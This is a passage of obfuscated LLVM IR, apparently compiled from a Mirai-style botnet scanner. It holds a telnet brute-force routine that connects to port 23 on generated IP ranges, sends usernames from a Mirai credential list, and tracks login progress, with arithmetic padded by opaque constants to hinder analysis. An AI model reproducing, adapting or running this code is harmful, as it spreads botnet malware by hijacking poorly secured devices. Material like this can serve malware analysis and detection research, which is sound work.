  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub i32 0, 100
  %27 = add i32 %25, %26
  %28 = sub nsw i32 %25, 100
  store i32 %27, i32* %5, align 4
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sgt i32 %29, %30
  br i1 %31, label %32, label %34

; <label>:32:                                     ; preds = %2
  %33 = load i32, i32* %4, align 4
  store i32 %33, i32* %5, align 4
  br label %34

; <label>:34:                                     ; preds = %32, %2
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = call zeroext i16 @htons(i16 zeroext 23) #10
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = call noalias i8* @malloc(i64 1025) #5
  store i8* %40, i8** %17, align 8
  %41 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 1025, i32 1, i1 false)
  %42 = load i32, i32* %5, align 4
  %43 = zext i32 %42 to i64
  %44 = call i8* @llvm.stacksave()
  store i8* %44, i8** %19, align 8
  %45 = alloca %struct.telstate_t, i64 %43, align 16
  %46 = bitcast %struct.telstate_t* %45 to i8*
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = mul i64 %48, 5
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 %49, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %50

; <label>:50:                                     ; preds = %68, %34
  %51 = load i32, i32* %6, align 4
  %52 = load i32, i32* %5, align 4
  %53 = icmp slt i32 %51, %52
  br i1 %53, label %54, label %74

; <label>:54:                                     ; preds = %50
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %56
  %58 = bitcast %struct.telstate_t* %57 to i8*
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 32, i32 16, i1 false)
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %60
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %61, i32 0, i32 3
  store i8 1, i8* %62, align 1
  %63 = load i8*, i8** %17, align 8
  %64 = load i32, i32* %6, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %65
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %66, i32 0, i32 9
  store i8* %63, i8** %67, align 8
  br label %68

; <label>:68:                                     ; preds = %54
  %69 = load i32, i32* %6, align 4
  %70 = add i32 %69, 399820843
  %71 = add i32 %70, 1
  %72 = sub i32 %71, 399820843
  %73 = add nsw i32 %69, 1
  store i32 %72, i32* %6, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  br label %75

; <label>:75:                                     ; preds = %933, %74
  br label %76

; <label>:76:                                     ; preds = %75
  store i32 0, i32* %6, align 4
  br label %77

; <label>:77:                                     ; preds = %928, %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %5, align 4
  %80 = icmp slt i32 %78, %79
  br i1 %80, label %81, label %933

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 7
  %86 = load i32, i32* %85, align 16
  %87 = icmp eq i32 %86, 0
  br i1 %87, label %88, label %95

; <label>:88:                                     ; preds = %81
  %89 = call i64 @time(i64* null) #5
  %90 = trunc i64 %89 to i32
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 7
  store i32 %90, i32* %94, align 16
  br label %95

; <label>:95:                                     ; preds = %88, %81
  %96 = load i32, i32* %6, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %97
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %98, i32 0, i32 2
  %100 = load i8, i8* %99, align 8
  %101 = zext i8 %100 to i32
  switch i32 %101, label %927 [
    i32 0, label %102
    i32 1, label %245
    i32 2, label %378
    i32 3, label %434
    i32 4, label %479
    i32 5, label %534
    i32 6, label %579
    i32 7, label %681
    i32 8, label %763
  ]

; <label>:102:                                    ; preds = %95
  %103 = load i32, i32* %6, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 3
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 1
  br i1 %109, label %110, label %130

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* %6, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 9
  %115 = load i8*, i8** %114, align 8
  store i8* %115, i8** %20, align 8
  %116 = load i32, i32* %6, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %117
  %119 = bitcast %struct.telstate_t* %118 to i8*
  call void @llvm.memset.p0i8.i64(i8* %119, i8 0, i64 32, i32 16, i1 false)
  %120 = load i8*, i8** %20, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 9
  store i8* %120, i8** %124, align 8
  %125 = call i32 @MiraiIPRanges()
  %126 = load i32, i32* %6, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 1
  store i32 %125, i32* %129, align 4
  br label %182

; <label>:130:                                    ; preds = %102
  %131 = load i32, i32* %6, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 3
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %181

; <label>:138:                                    ; preds = %130
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 4
  %143 = load i8, i8* %142, align 2
  %144 = sub i8 0, 1
  %145 = sub i8 %143, %144
  %146 = add i8 %143, 1
  store i8 %145, i8* %142, align 2
  %147 = load i32, i32* %6, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 5
  %151 = load i8, i8* %150, align 1
  %152 = sub i8 0, 1
  %153 = sub i8 %151, %152
  %154 = add i8 %151, 1
  store i8 %153, i8* %150, align 1
  %155 = load i32, i32* %6, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 5
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i64
  %161 = icmp eq i64 %160, 35
  br i1 %161, label %162, label %167

; <label>:162:                                    ; preds = %138
  %163 = load i32, i32* %6, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 3
  store i8 1, i8* %166, align 1
  br label %167

; <label>:167:                                    ; preds = %162, %138
  %168 = load i32, i32* %6, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %169
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %170, i32 0, i32 4
  %172 = load i8, i8* %171, align 2
  %173 = zext i8 %172 to i64
  %174 = icmp eq i64 %173, 34
  br i1 %174, label %175, label %180

; <label>:175:                                    ; preds = %167
  %176 = load i32, i32* %6, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %177
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %178, i32 0, i32 3
  store i8 1, i8* %179, align 1
  br label %928

; <label>:180:                                    ; preds = %167
  br label %181

; <label>:181:                                    ; preds = %180, %130
  br label %182

; <label>:182:                                    ; preds = %181, %110
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %183, align 4
  %184 = call zeroext i16 @htons(i16 zeroext 23) #10
  %185 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %184, i16* %185, align 2
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %187 = getelementptr inbounds [8 x i8], [8 x i8]* %186, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %187, i8 0, i64 8, i32 4, i1 false)
  %188 = load i32, i32* %6, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 1
  %192 = load i32, i32* %191, align 4
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %194 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %193, i32 0, i32 0
  store i32 %192, i32* %194, align 4
  %195 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %196 = load i32, i32* %6, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 0
  store i32 %195, i32* %199, align 16
  %200 = load i32, i32* %6, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = icmp eq i32 %204, -1
  br i1 %205, label %206, label %207

; <label>:206:                                    ; preds = %182
  br label %928

; <label>:207:                                    ; preds = %182
  %208 = load i32, i32* %6, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %209
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %210, i32 0, i32 0
  %212 = load i32, i32* %211, align 16
  %213 = load i32, i32* %6, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = call i32 (i32, i32, ...) @fcntl(i32 %217, i32 3, i8* null)
  %219 = and i32 %218, 2048
  %220 = xor i32 %218, 2048
  %221 = or i32 %219, %220
  %222 = or i32 %218, 2048
  %223 = call i32 (i32, i32, ...) @fcntl(i32 %212, i32 4, i32 %221)
  %224 = load i32, i32* %6, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 16
  %229 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %230 = call i32 @connect(i32 %228, %struct.sockaddr* %229, i32 16)
  %231 = icmp eq i32 %230, -1
  br i1 %231, label %232, label %240

; <label>:232:                                    ; preds = %207
  %233 = call i32* @__errno_location() #10
  %234 = load i32, i32* %233, align 4
  %235 = icmp ne i32 %234, 115
  br i1 %235, label %236, label %240

; <label>:236:                                    ; preds = %232
  %237 = load i32, i32* %6, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %238
  call void @reset_telstate(%struct.telstate_t* %239)
  br label %244

; <label>:240:                                    ; preds = %232, %207
  %241 = load i32, i32* %6, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %242
  call void @advance_telstate(%struct.telstate_t* %243, i32 1)
  br label %244

; <label>:244:                                    ; preds = %240, %236
  br label %927

; <label>:245:                                    ; preds = %95
  br label %246

; <label>:246:                                    ; preds = %245
  %247 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %248 = getelementptr inbounds [16 x i64], [16 x i64]* %247, i64 0, i64 0
  %249 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %248) #5, !srcloc !6
  %250 = extractvalue { i64, i64* } %249, 0
  %251 = extractvalue { i64, i64* } %249, 1
  %252 = trunc i64 %250 to i32
  store i32 %252, i32* %21, align 4
  %253 = ptrtoint i64* %251 to i64
  %254 = trunc i64 %253 to i32
  store i32 %254, i32* %22, align 4
  br label %255

; <label>:255:                                    ; preds = %246
  br label %256

; <label>:256:                                    ; preds = %255
  %257 = load i32, i32* %6, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %258
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 16
  %262 = srem i32 %261, 64
  %263 = zext i32 %262 to i64
  %264 = shl i64 1, %263
  %265 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %266 = load i32, i32* %6, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 0
  %270 = load i32, i32* %269, align 16
  %271 = sdiv i32 %270, 64
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds [16 x i64], [16 x i64]* %265, i64 0, i64 %272
  %274 = load i64, i64* %273, align 8
  %275 = xor i64 %274, -1
  %276 = xor i64 %264, -1
  %277 = xor i64 -8020806360369998008, -1
  %278 = and i64 %275, -8020806360369998008
  %279 = and i64 %274, %277
  %280 = and i64 %276, -8020806360369998008
  %281 = and i64 %264, %277
  %282 = or i64 %278, %279
  %283 = or i64 %280, %281
  %284 = xor i64 %282, %283
  %285 = or i64 %275, %276
  %286 = xor i64 %285, -1
  %287 = or i64 -8020806360369998008, %277
  %288 = and i64 %286, %287
  %289 = or i64 %284, %288
  %290 = or i64 %274, %264
  store i64 %289, i64* %273, align 8
  %291 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %291, align 8
  %292 = load i32, i32* %3, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %293, i64* %294, align 8
  %295 = load i32, i32* %6, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = sub i32 0, 1
  %301 = sub i32 %299, %300
  %302 = add nsw i32 %299, 1
  %303 = call i32 @select(i32 %301, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %303, i32* %7, align 4
  %304 = load i32, i32* %7, align 4
  %305 = icmp eq i32 %304, 1
  br i1 %305, label %306, label %351

; <label>:306:                                    ; preds = %256
  %307 = call i64 @time(i64* null) #5
  %308 = trunc i64 %307 to i32
  %309 = load i32, i32* %6, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %310
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %311, i32 0, i32 7
  store i32 %308, i32* %312, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %313 = load i32, i32* %6, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 0
  %317 = load i32, i32* %316, align 16
  %318 = bitcast i32* %15 to i8*
  %319 = call i32 @getsockopt(i32 %317, i32 1, i32 4, i8* %318, i32* %14) #5
  %320 = load i32, i32* %15, align 4
  %321 = icmp ne i32 %320, 0
  br i1 %321, label %322, label %326

; <label>:322:                                    ; preds = %306
  %323 = load i32, i32* %6, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %324
  call void @reset_telstate(%struct.telstate_t* %325)
  br label %350

; <label>:326:                                    ; preds = %306
  %327 = load i32, i32* %6, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 16
  %332 = load i32, i32* %6, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %333
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %334, i32 0, i32 0
  %336 = load i32, i32* %335, align 16
  %337 = call i32 (i32, i32, ...) @fcntl(i32 %336, i32 3, i8* null)
  %338 = xor i32 %337, -1
  %339 = xor i32 -2049, -1
  %340 = xor i32 1654609837, -1
  %341 = or i32 %338, %339
  %342 = or i32 1654609837, %340
  %343 = xor i32 %341, -1
  %344 = and i32 %343, %342
  %345 = and i32 %337, -2049
  %346 = call i32 (i32, i32, ...) @fcntl(i32 %331, i32 4, i32 %344)
  %347 = load i32, i32* %6, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %348
  call void @advance_telstate(%struct.telstate_t* %349, i32 2)
  br label %350

; <label>:350:                                    ; preds = %326, %322
  br label %928

; <label>:351:                                    ; preds = %256
  %352 = load i32, i32* %7, align 4
  %353 = icmp eq i32 %352, -1
  br i1 %353, label %354, label %358

; <label>:354:                                    ; preds = %351
  %355 = load i32, i32* %6, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %356
  call void @reset_telstate(%struct.telstate_t* %357)
  br label %928

; <label>:358:                                    ; preds = %351
  br label %359

; <label>:359:                                    ; preds = %358
  %360 = load i32, i32* %6, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 7
  %364 = load i32, i32* %363, align 16
  %365 = sub i32 0, %364
  %366 = sub i32 0, 7
  %367 = add i32 %365, %366
  %368 = sub i32 0, %367
  %369 = add i32 %364, 7
  %370 = zext i32 %368 to i64
  %371 = call i64 @time(i64* null) #5
  %372 = icmp slt i64 %370, %371
  br i1 %372, label %373, label %377

; <label>:373:                                    ; preds = %359
  %374 = load i32, i32* %6, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %375
  call void @reset_telstate(%struct.telstate_t* %376)
  br label %377

; <label>:377:                                    ; preds = %373, %359
  br label %927

; <label>:378:                                    ; preds = %95
  %379 = load i32, i32* %6, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %380
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %381, i32 0, i32 0
  %383 = load i32, i32* %382, align 16
  %384 = load i32, i32* %3, align 4
  %385 = load i32, i32* %6, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 9
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @read_until_response(i32 %383, i32 %384, i8* %389, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %391 = icmp ne i32 %390, 0
  br i1 %391, label %392, label %415

; <label>:392:                                    ; preds = %378
  %393 = call i64 @time(i64* null) #5
  %394 = trunc i64 %393 to i32
  %395 = load i32, i32* %6, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %396
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %397, i32 0, i32 7
  store i32 %394, i32* %398, align 16
  %399 = load i32, i32* %6, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 9
  %403 = load i8*, i8** %402, align 8
  %404 = call i32 @contains_fail(i8* %403)
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %406, label %410

; <label>:406:                                    ; preds = %392
  %407 = load i32, i32* %6, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %408
  call void @advance_telstate(%struct.telstate_t* %409, i32 0)
  br label %414

; <label>:410:                                    ; preds = %392
  %411 = load i32, i32* %6, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %412
  call void @advance_telstate(%struct.telstate_t* %413, i32 3)
  br label %414

; <label>:414:                                    ; preds = %410, %406
  br label %928

; <label>:415:                                    ; preds = %378
  %416 = load i32, i32* %6, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 7
  %420 = load i32, i32* %419, align 16
  %421 = sub i32 0, %420
  %422 = sub i32 0, 7
  %423 = add i32 %421, %422
  %424 = sub i32 0, %423
  %425 = add i32 %420, 7
  %426 = zext i32 %424 to i64
  %427 = call i64 @time(i64* null) #5
  %428 = icmp slt i64 %426, %427
  br i1 %428, label %429, label %433

; <label>:429:                                    ; preds = %415
  %430 = load i32, i32* %6, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %431
  call void @reset_telstate(%struct.telstate_t* %432)
  br label %433

; <label>:433:                                    ; preds = %429, %415
  br label %927

; <label>:434:                                    ; preds = %95
  %435 = load i32, i32* %6, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %436
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 16
  %440 = load i32, i32* %6, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 4
  %444 = load i8, i8* %443, align 2
  %445 = zext i8 %444 to i64
  %446 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %445
  %447 = load i8*, i8** %446, align 8
  %448 = load i32, i32* %6, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 4
  %452 = load i8, i8* %451, align 2
  %453 = zext i8 %452 to i64
  %454 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %453
  %455 = load i8*, i8** %454, align 8
  %456 = call i64 @strlen(i8* %455) #9
  %457 = call i64 @send(i32 %439, i8* %447, i64 %456, i32 16384)
  %458 = icmp slt i64 %457, 0
  br i1 %458, label %459, label %463

; <label>:459:                                    ; preds = %434
  %460 = load i32, i32* %6, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %461
  call void @reset_telstate(%struct.telstate_t* %462)
  br label %928

; <label>:463:                                    ; preds = %434
  %464 = load i32, i32* %6, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 16
  %469 = call i64 @send(i32 %468, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %470 = icmp slt i64 %469, 0
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %463
  %472 = load i32, i32* %6, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %473
  call void @reset_telstate(%struct.telstate_t* %474)
  br label %928

; <label>:475:                                    ; preds = %463
  %476 = load i32, i32* %6, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %477
  call void @advance_telstate(%struct.telstate_t* %478, i32 4)
  br label %927

; <label>:479:                                    ; preds = %95
  %480 = load i32, i32* %6, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 0
  %484 = load i32, i32* %483, align 16
  %485 = load i32, i32* %3, align 4
  %486 = load i32, i32* %6, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 9
  %490 = load i8*, i8** %489, align 8
  %491 = call i32 @read_until_response(i32 %484, i32 %485, i8* %490, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %493, label %516

; <label>:493:                                    ; preds = %479
  %494 = call i64 @time(i64* null) #5
  %495 = trunc i64 %494 to i32
  %496 = load i32, i32* %6, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 7
  store i32 %495, i32* %499, align 16
  %500 = load i32, i32* %6, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 9
  %504 = load i8*, i8** %503, align 8
  %505 = call i32 @contains_fail(i8* %504)
  %506 = icmp ne i32 %505, 0
  br i1 %506, label %507, label %511

; <label>:507:                                    ; preds = %493
  %508 = load i32, i32* %6, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %509
  call void @advance_telstate(%struct.telstate_t* %510, i32 0)
  br label %515

; <label>:511:                                    ; preds = %493
  %512 = load i32, i32* %6, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %513
  call void @advance_telstate(%struct.telstate_t* %514, i32 5)
  br label %515

; <label>:515:                                    ; preds = %511, %507
  br label %928

; <label>:516:                                    ; preds = %479
  %517 = load i32, i32* %6, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i64 %518
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %519, i32 0, i32 7
  %521 = load i32, i32* %520, align 16
